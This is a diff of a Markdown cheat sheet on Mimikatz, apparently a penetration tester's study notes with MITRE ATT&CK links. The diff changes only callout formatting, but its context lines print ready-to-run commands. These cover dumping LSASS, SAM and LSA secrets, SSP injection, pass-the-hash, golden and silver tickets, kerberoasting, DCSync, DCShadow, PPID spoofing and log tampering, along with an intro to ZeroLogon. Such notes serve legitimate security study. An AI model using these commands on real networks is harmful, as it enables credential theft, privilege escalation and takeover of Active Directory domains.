@@ -1,34 +1,24 @@
 
 ![[Pasted image 20260227171733.png]]
 
-> [!info]+ Log Module – Save Command Output
->
+> [!info]- Log Module – Save Command Output
 > Allows saving Mimikatz session output to a file.
->
 > ---
->
 > ## Start Logging
->
 > ```bash
 > mimikatz # log C:\Temp\msupdate.log
 > ```
->
 > - Creates a log file at the specified path  
 > - You must define the full file path and file name  
 > - All subsequent command output will be written to this file  
->
 > ---
->
 > ## Stop Logging
->
 > ```bash
 > mimikatz # log /stop
 > ```
->
 > Stops writing output to the log file.
 
-
-> [!info]+ AppLocker Bypass & Misc Module Capabilities
+> [!info]- AppLocker Bypass & Misc Module Capabilities
 >
 > The `misc` module in Mimikatz includes helper functions that may assist in bypassing application control mechanisms.
 >
@@ -88,8 +78,7 @@
 >
 > Uses API hooking techniques that may assist in defense evasion.
 
-
-> [!tip]+ Windows Privileges & Mimikatz Privilege Module
+> [!tip]- Windows Privileges & Mimikatz Privilege Module
 >
 > Privileges define what actions a security token can perform on the system.
 >
@@ -180,8 +169,7 @@
 > Enables **SeSystemEnvironmentPrivilege**  
 > Allows modification of system firmware environment variables.
 
-
-> [!warning]+ Privilege Escalation – Token Abuse & Process Injection
+> [!warning]- Privilege Escalation – Token Abuse & Process Injection
 >
 > MITRE ATT&CK:
 > https://attack.mitre.org/techniques/T1134/001
@@ -292,9 +280,7 @@
 > 4. Verify context
 > 5. Spawn process under elevated token
 
-
-
-> [!danger]+ Defense Evasion – Log Tampering & PPID Spoofing
+> [!danger]- Defense Evasion – Log Tampering & PPID Spoofing
 >
 > MITRE ATT&CK:
 > https://attack.mitre.org/techniques/T1070/001
@@ -358,9 +344,7 @@
 > - If `/ppid` is not specified, default parent may be `lsass.exe`
 > - Used to evade behavioral detection based on process lineage
 
-
-
-> [!tip]+ Remote Access – RPC, RDP & Built-in Methods
+> [!tip]- Remote Access – RPC, RDP & Built-in Methods
 >
 > Mimikatz can operate in client/server mode over RPC (default port 135).
 >
@@ -471,8 +455,7 @@
 > wmic /node:<172.20.10.1> process call create calc
 > ```
 
-
-> [!info]+ Service Module – Manage Windows Services
+> [!info]- Service Module – Manage Windows Services
 >
 > Allows starting and stopping Windows services directly from Mimikatz.
 >
@@ -520,7 +503,7 @@
 >
 > Can be used for maintaining execution through a service context.
 
-> [!warning]+ Process Module – Manage Windows Processes
+> [!warning]- Process Module – Manage Windows Processes
 >
 > Allows interaction with system processes directly from Mimikatz.
 >
@@ -611,8 +594,7 @@
 > mimikatz # process::terminate /pid:<PID>
 > ```
 
-
-> [!info]+ Hash Dump – LSA & Credential Protection Overview
+> [!info]- Hash Dump – LSA & Credential Protection Overview
 >
 > ---
 >
@@ -706,10 +688,9 @@
 > - WDIGEST
 >
 > They handle authentication protocols and may temporarily hold credentials in memory.
-
 ### Credential Guard Bypass & LSASS Interaction
 
-> [!warning]+ Bypass Credential Guard & Touch LSASS
+> [!warning]- Bypass Credential Guard & Touch LSASS
 > Techniques to interact with or modify LSASS protections.
 >
 > ---
@@ -738,10 +719,9 @@
 > mimikatz # lsadump::lsa /patch
 > mimikatz # lsadump::lsa /inject
 > ```
-
 ### Dump Hash – Touching LSASS Providers
 
-> [!warning]+ Dump Credentials from LSASS
+>[!danger]- Dump Credentials from LSASS
 >
 > ```bash
 > mimikatz # privilege::debug
@@ -754,7 +734,7 @@
 
 ### Inject SSP (Custom Security Support Provider)
 
-> [!warning]+ Inject Custom SSP (memssp)
+> [!danger]- Inject Custom SSP (memssp)
 >
 > ```bash
 > mimikatz # privilege::debug
@@ -778,7 +758,7 @@
 
 ### Dumping SAM & Registry Credentials
 
-> [!warning]+ Dump SAM (Registry Extraction)
+> [!warning]- Dump SAM (Registry Extraction)
 >
 > Registry SAM is protected with SysKey.
 >
@@ -799,7 +779,7 @@
 
 ### Cached Credentials & Secrets
 
-> [!warning]+ Cached Credentials & LSA Secrets
+> [!warning]- Cached Credentials & LSA Secrets
 >
 > Registry location:
 >
@@ -825,7 +805,7 @@
 > - Service account secrets
 ### Pass-The-Hash Attack
 
-> [!warning]+ Pass-The-Hash (PTH)
+> [!warning]- Pass-The-Hash (PTH)
 >
 > ```bash
 > mimikatz # privilege::debug
@@ -840,9 +820,10 @@
 > ```
 
 ## DC ATTACK
+---
 
 
-> [!info]+ Kerberos Overview
+> [!info]- Kerberos Overview
 > **KDC (Key Distribution Center)** runs on the Domain Controller and handles authentication and ticket issuance.
 >
 > ---
@@ -879,7 +860,7 @@
 >   - Unique identifier for services in AD
 >   - Used by Kerberos to associate tickets with services
 
-> [!warning]+ Over Pass The Hash (OPTH)
+> [!warning]- Over Pass The Hash (OPTH)
 > Over Pass The Hash combines **Pass-the-Hash (PTH)** and **Pass-the-Ticket (PTT)** techniques.  
 > The attacker uses NTLM material to obtain or forge Kerberos authentication.
 >
@@ -965,7 +946,7 @@
 > mimikatz # kerberos::ask /target:CIFS/hostname.domain.local
 > ```
 
-> [!warning]+  Golden Ticket (TGT)
+> [!warning]-  Golden Ticket (TGT)
 > A Golden Ticket attack forges a Kerberos **TGT (Ticket Granting Ticket)** using the `krbtgt` account hash.  
 > With this ticket, an attacker can authenticate as any user in the domain with arbitrary privileges.
 >
@@ -1020,7 +1001,7 @@
 > - `/sids:513,512,500`  (add group SIDs: Domain Users, Domain Admins, etc.)
 > - `/endin:50`  (validity in years)
 
-> [!info]+  Silver Ticket (TGS)
+> [!info]-  Silver Ticket (TGS)
 > A Silver Ticket attack forges a Kerberos **TGS (Ticket Granting Service)** ticket for a specific service using the target server’s NTLM hash.  
 > Unlike Golden Ticket, it does NOT require the `krbtgt` hash and does not interact with the Domain Controller after ticket creation.
 >
@@ -1087,7 +1068,7 @@
 > kekeo # kerberos::ask /service:cifs/hostname.domain.local /roast /export
 > ```
 
-> [!danger]+ DCSync
+> [!danger]- DCSync
 > DCSync is an Active Directory attack technique where the attacker impersonates a Domain Controller and requests account replication data from a legitimate DC.  
 > It allows dumping password hashes without directly accessing the Domain Controller.
 >
@@ -1118,7 +1099,7 @@
 > mimikatz # lsadump::dcsync /all /csv
 > ```
 
-> [!warning]+ DCShadow
+> [!warning]- DCShadow
 > DCShadow is an Active Directory attack technique where the attacker registers a rogue Domain Controller and pushes malicious replication data to a legitimate DC.  
 > Unlike DCSync (which pulls data), DCShadow **injects and replicates modified objects** into the directory.
 >
@@ -1177,9 +1158,7 @@
 > ([adsisearcher]"(&(objectCategory=computer)(name=<hostname>))").findall.properties
 > ```
 
-
-
- > [!tip]+ ZeroLogon
+ > [!tip]- ZeroLogon
 >  ZeroLogon is a critical vulnerability in the Netlogon authentication protocol used by Windows Domain Controllers. 
 > Due to a flaw in the cryptographic implementation, an attacker within the network can impersonate a domain-joined computer — including the Domain Controller itself.
 > If exploited on an unpatched system, this vulnerability can lead to full domain compromise by allowing unauthorized privilege escalation and access to sensitive authentication  data.
